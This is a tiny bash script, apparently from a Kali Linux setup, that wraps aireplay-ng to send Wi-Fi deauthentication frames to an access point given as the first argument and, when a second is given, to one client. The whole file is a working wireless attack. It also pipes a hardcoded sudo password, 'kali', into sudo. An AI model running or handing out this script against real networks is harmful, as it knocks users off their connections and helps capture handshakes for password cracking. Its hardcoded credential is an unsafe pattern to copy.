#! /bin/bash

if [[ -n $2 ]]; then
    echo 'kali' | sudo -S aireplay-ng -0 2 -a $1 -c $2 wlan0
else
    echo 'kali' | sudo -S aireplay-ng -0 2 -a $1 wlan0
fi
